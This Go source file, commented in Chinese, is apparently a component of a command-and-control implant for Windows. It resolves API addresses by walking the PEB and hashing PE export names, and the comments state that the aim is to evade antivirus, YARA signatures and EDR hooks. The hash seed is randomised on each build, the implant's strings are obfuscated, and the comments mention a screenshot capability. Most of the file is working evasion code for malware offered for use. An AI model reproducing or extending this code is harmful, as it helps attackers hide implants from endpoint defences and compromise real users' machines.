//go:build windows

package main

import (
	"sync"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ─── API 哈希解析（免杀）───────────────────────────────────────────────
//
// 不再使用 windows.NewLazySystemDLL + NewProc("API名") 的调用模式
// （该模式是 Go C2 植入端的经典静态特征，YARA 家族规则命中点）。
// 改为运行时通过 PEB 模块链表 + PE 导出表哈希匹配手工解析 API 地址，
// 解析过程不调用 GetProcAddress（该函数常被 EDR hook 用于追踪动态解析），
// 二进制产物中也不保留任何 API 名明文。
//
// 模板编译期字符串混淆（服务端 obfuscateImplantSources）会自动将本文件
// 中的 "kernel32.dll"、"OpenProcess" 等字符串字面量加密为 xd("hex")，
// 运行时才解码为明文参与哈希计算。
//
// 架构说明：
//   - amd64/386：getAPIFast 被 peb_windows.go 的 init 覆盖为 PEB+导出表哈希解析；
//   - 其他架构：getAPIFast 为空实现，getAPI 直接走 getAPICompat（x/sys 库封装）。

// apiHashSeed/apiHashMul FNV-1a 哈希的种子与乘子；每构建随机注入（P1-4），
// 使同一 API 名在不同样本中的哈希值不同，破坏基于固定 API 哈希的静态特征。
var apiHashSeed uint32 = 0x811c9dc5
var apiHashMul uint32 = 0x01000193

// apiHash 计算 API 名的 FNV-1a 32 位哈希，用于导出表匹配。
func apiHash(s string) uint32 {
	var h uint32 = apiHashSeed
	for i := 0; i < len(s); i++ {
		h ^= uint32(s[i])
		h *= apiHashMul
	}
	return h
}

// getProcAddr 手工解析模块导出表中哈希匹配的函数地址（RVA -> VA）。
// 支持 PE32（386）与 PE32+（amd64）两种可选头。
func getProcAddr(moduleBase uintptr, hash uint32) uintptr {
	if moduleBase == 0 {
		return 0
	}
	// DOS 头："MZ"
	if *(*uint16)(unsafe.Pointer(moduleBase)) != 0x5A4D {
		return 0
	}
	e_lfanew := *(*uint32)(unsafe.Pointer(moduleBase + 0x3C))
	ntHeaders := moduleBase + uintptr(e_lfanew)
	// PE 签名："PE\0\0"
	if *(*uint32)(unsafe.Pointer(ntHeaders)) != 0x00004550 {
		return 0
	}
	// 可选头 Magic：PE32=0x10B，PE32+=0x20B
	magic := *(*uint16)(unsafe.Pointer(ntHeaders + 0x18))
	var exportDirRVA uint32
	switch magic {
	case 0x10B: // PE32
		exportDirRVA = *(*uint32)(unsafe.Pointer(ntHeaders + 0x18 + 0x60))
	case 0x20B: // PE32+
		exportDirRVA = *(*uint32)(unsafe.Pointer(ntHeaders + 0x18 + 0x70))
	default:
		return 0
	}
	if exportDirRVA == 0 {
		return 0
	}
	exp := moduleBase + uintptr(exportDirRVA)
	numNames := *(*uint32)(unsafe.Pointer(exp + 0x18))
	addrOfFunctions := *(*uint32)(unsafe.Pointer(exp + 0x1C))
	addrOfNames := *(*uint32)(unsafe.Pointer(exp + 0x20))
	addrOfNameOrdinals := *(*uint32)(unsafe.Pointer(exp + 0x24))
	for i := uint32(0); i < numNames; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(moduleBase + uintptr(addrOfNames) + uintptr(i*4)))
		namePtr := moduleBase + uintptr(nameRVA)
		var h uint32 = apiHashSeed
		for {
			c := *(*byte)(unsafe.Pointer(namePtr))
			if c == 0 {
				break
			}
			h ^= uint32(c)
			h *= apiHashMul
			namePtr++
		}
		if h == hash {
			ord := *(*uint16)(unsafe.Pointer(moduleBase + uintptr(addrOfNameOrdinals) + uintptr(i*2)))
			funcRVA := *(*uint32)(unsafe.Pointer(moduleBase + uintptr(addrOfFunctions) + uintptr(uint32(ord)*4)))
			return moduleBase + uintptr(funcRVA)
		}
	}
	return 0
}

// getAPIFast 在 amd64/386 平台被 peb_windows.go 的 init 覆盖为
// "PEB 遍历 + 导出表哈希解析" 实现；其余架构保持空实现。
var getAPIFast = func(module, api string) uintptr { return 0 }

// getAPI 解析指定模块内 API 的运行时地址。
func getAPI(module, api string) uintptr {
	if addr := getAPIFast(module, api); addr != 0 {
		return addr
	}
	// 关键：Go 进程默认不会加载 user32.dll/gdi32.dll 等 GUI 库。
	// 此时 PEB 模块链表和 GetModuleHandleEx（仅查已加载模块）都会解析失败，
	// 导致截图等 GUI 功能在交互会话下也全部失败（err=0）。
	// 先 LoadLibrary 主动加载模块，让模块进入 PEB 链表后再走免杀主路径解析。
	if dll, err := windows.LoadDLL(module); err == nil && dll != nil {
		if addr := getAPIFast(module, api); addr != 0 {
			return addr
		}
	}
	return getAPICompat(module, api)
}

// getAPICompat 兜底：x/sys 库封装（LoadLibrary + GetProcAddress）。
// 仅当 PEB 遍历或导出表哈希匹配失败时使用，保证功能不坏。
// 注意不能用 GetModuleHandleEx：它不加载模块，GUI 库未加载时必然失败。
func getAPICompat(module, api string) uintptr {
	dll, err := windows.LoadDLL(module)
	if err != nil || dll == nil {
		return 0
	}
	addr, err := windows.GetProcAddress(dll.Handle, api)
	if err != nil {
		return 0
	}
	return addr
}

// ─── 兼容 windows.LazyProc 的最小接口 ──────────────────────────────────

// apiProc 模拟 LazyProc 的 Call/Find 接口，地址在首次调用时经 getAPI 懒解析。
// 懒解析保证包级 var（如截图模块的 procGetDC 等）在 peb_windows.go 的 init()
// 设置 getAPIFast 之后才真正解析，从而走 apihash 主路径而非 LazyDLL 兜底。
type apiProc struct {
	module string
	api    string
	addr   uintptr
	once   sync.Once
}

func resolveAPI(module, api string) *apiProc {
	return &apiProc{module: module, api: api}
}

func (p *apiProc) resolved() uintptr {
	if p == nil {
		return 0
	}
	p.once.Do(func() {
		p.addr = getAPI(p.module, p.api)
	})
	return p.addr
}

func (p *apiProc) Call(a ...uintptr) (r1, r2 uintptr, lastErr error) {
	addr := p.resolved()
	if addr == 0 {
		return 0, 0, syscall.Errno(127) // ERROR_PROC_NOT_FOUND
	}
	return syscall.SyscallN(addr, a...)
}

func (p *apiProc) Find() error {
	if p.resolved() == 0 {
		return syscall.Errno(127)
	}
	return nil
}
